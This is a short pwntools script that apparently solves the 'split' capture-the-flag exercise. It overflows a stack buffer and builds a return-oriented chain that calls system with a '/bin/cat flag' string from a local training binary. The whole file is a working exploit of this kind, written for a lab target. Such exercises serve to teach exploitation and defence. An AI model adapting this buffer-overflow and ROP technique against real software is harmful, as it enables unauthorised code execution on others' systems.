from pwn import *

context(arch='amd64', os='linux', log_level='DEBUG')

p = process('./split')
elf = ELF('./split')

p.recvuntil('>')

pop_rdi_ret = 0x400883
bin_cat_flag = 0x601060

payload = flat(['a'*0x28, pop_rdi_ret, bin_cat_flag, elf.plt['system']])
p.sendline(payload)

p.interactive()